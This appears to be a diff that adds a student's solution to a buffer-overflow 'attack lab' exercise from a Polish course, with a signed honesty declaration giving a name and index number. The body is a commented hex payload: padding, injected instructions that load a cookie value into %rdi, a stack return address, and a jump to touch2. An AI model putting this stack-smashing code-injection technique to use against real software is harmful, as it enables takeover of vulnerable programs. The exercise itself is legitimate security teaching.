@@ -1,0 +1,14 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu Piotr Stachowicz, 337942
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+42 42 42 42 42 42 42 42 /* nic */
+48 c7 c7 20 43 36 28 c3 /* mov $0x28364320, %rdi oraz ret */
+00 00 00 00 00 00 00 00 /* nic */
+d0 12 68 55 00 00 00 00 /* Adres stosu pod ktorym znajduje sie instrukcja z linijki 11 */
+c7 1c 40 00 00 00 00 00 /* ret z linijki 11 bierze ten adres i skacze pod touch2
